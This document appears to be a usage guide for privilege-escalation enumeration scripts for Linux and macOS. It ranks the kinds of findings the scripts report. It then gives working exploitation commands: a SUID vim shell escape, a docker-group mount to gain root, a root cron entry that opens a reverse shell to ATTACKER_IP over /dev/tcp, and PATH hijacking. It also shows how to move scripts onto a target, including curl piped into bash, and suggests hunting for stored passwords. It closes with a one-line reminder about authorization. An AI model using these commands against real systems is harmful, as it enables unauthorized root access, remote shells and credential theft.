# Quick Usage Guide

## Running the Scripts

### Linux Enumeration
```bash
cd scripts
./linpeas_advanced.sh
```

### macOS Enumeration
```bash
cd scripts
./macpeas_advanced.sh
```

## Command-Line Options

Both scripts support the following options:

```bash
-o, --output FILE    Save output to specified file
-h, --help          Show help message
```

### Examples

**Basic run (saves to /tmp with timestamp):**
```bash
./linpeas_advanced.sh
```

**Save to custom location:**
```bash
./linpeas_advanced.sh -o ~/Desktop/enum_results.txt
```

**View help:**
```bash
./linpeas_advanced.sh --help
```

## Analyzing Results

### Priority Order
1. **CRITICAL Findings** - Exploit these first (instant root usually)
2. **HIGH-RISK Findings** - Strong privilege escalation vectors
3. **POTENTIAL Findings** - Worth investigating
4. **INFO Findings** - Context and system information

### Common Critical Findings

**Linux:**
- User in `docker` or `lxd` group → Container escape to root
- Writable `/etc/shadow` or `/etc/passwd` → Add root user
- SUID binaries (vim, nano, find, python) → GTFOBins exploit
- `LD_PRELOAD` or writable sudo files → Code execution as root
- Writable cron scripts → Scheduled root execution
- File capabilities on binaries → Privilege escalation

**macOS:**
- SIP disabled → Write to system files
- Writable LaunchDaemons → Run code as root at boot
- Writable `/etc/sudoers` → Grant full sudo access
- Cached sudo credentials → Run commands as root
- Writable PATH directories → Binary hijacking
- TCC database readable → Privacy bypass

## Exploitation Examples

### SUID Binary (GTFOBins)
If you find SUID vim:
```bash
vim -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
```

### Docker Group
If user is in docker group:
```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

### Writable Cron Script
If `/etc/cron.d/` is writable:
```bash
echo '* * * * * root /bin/bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"' > /etc/cron.d/exploit
```

### PATH Hijacking
If writable directory in PATH before legitimate binary:
```bash
echo '#!/bin/bash' > /writable/path/vulnerable_binary
echo '/bin/bash -p' >> /writable/path/vulnerable_binary
chmod +x /writable/path/vulnerable_binary
```

## Transfer Scripts to Target

### Using wget
```bash
wget https://your-server.com/linpeas_advanced.sh
chmod +x linpeas_advanced.sh
./linpeas_advanced.sh
```

### Using curl
```bash
curl -o linpeas_advanced.sh https://your-server.com/linpeas_advanced.sh
chmod +x linpeas_advanced.sh
./linpeas_advanced.sh
```

### Using Python HTTP Server
On your machine:
```bash
python3 -m http.server 8000
```

On target:
```bash
wget http://YOUR_IP:8000/linpeas_advanced.sh
```

### Piped Execution (No Write Access)
```bash
curl http://YOUR_IP:8000/linpeas_advanced.sh | bash
```

## Tips & Tricks

1. **Always save output to a file** - Easier to grep and review later
2. **Run with and without sudo** - Some checks require elevated privileges
3. **Review the summary section first** - Prioritized findings
4. **Cross-reference with GTFOBins** - For SUID binaries exploitation
5. **Check kernel version** - Against known exploits (searchsploit)
6. **Look for passwords** - In configs, history files, environment variables
7. **Enumerate database credentials** - Often lead to password reuse

## Troubleshooting

**Script won't run - Permission denied:**
```bash
chmod +x scriptname.sh
```

**No color output:**
- Some terminals don't support ANSI colors
- Output is still readable, just not colored

**Some checks fail:**
- Normal behavior - permission denied on restricted files
- The script handles errors gracefully

**Want to run specific sections only:**
- Edit the `main()` function and comment out unwanted modules

## Next Steps After Enumeration

1. Research exploits for identified vulnerabilities
2. Check ExploitDB and searchsploit for kernel exploits
3. Test SUID/sudo binaries on GTFOBins
4. Look for password reuse opportunities
5. Enumerate network services if pivoting
6. Document findings for report

---

**Remember**: Only use on authorized systems!
